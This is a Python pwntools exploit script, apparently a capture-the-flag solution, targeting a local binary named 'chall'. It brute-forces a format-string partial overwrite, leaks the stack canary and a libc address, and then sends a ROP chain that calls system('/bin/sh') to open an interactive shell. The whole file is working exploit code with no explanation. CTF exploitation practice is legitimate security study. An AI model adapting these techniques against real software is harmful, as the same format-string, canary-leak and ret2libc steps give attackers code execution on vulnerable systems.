from pwn import *

#r = gdb.debug("./chall", gdbscript="""b *vuln+65""")
context.binary = exe = ELF("./chall")
context.log_level = "error"
libc = ELF("./libc.so.6")

again = True
while again:
    try:
        r = process("./chall_patched")
        r.send(b'%21064cz%9$hn'.ljust(17, b'\0')+b'\x18\x80')
        r.send(b'got the thing')
        r.recvuntil(b'z')
        got = r.recv()
        # less than 1/16 chance for this to succeed for reasons
        if b'got the thing' in got:
            print('got')
            again = False
            r.send(b'aa')
            r.recvuntil(b'aa')
            canary = b'\0' + r.recv(7)
            r.recv()
            print(f"{canary.hex() = }")
            r.send(f'%{37}$p'.encode()+b'\0')
            libc.address = int(r.recv(), 16) - libc.symbols['__libc_start_call_main'] - 122
            print(f"{hex(libc.address) = }")

            rop = ROP(libc)
            rop.raw(rop.find_gadget(['ret']))
            rop.system(next(libc.search(b'/bin/sh')))

            r.send(b'a' + canary + b'a'*8 + rop.chain())
            r.interactive()
    except KeyboardInterrupt:
        exit() 
    except:
        r.close()
        pass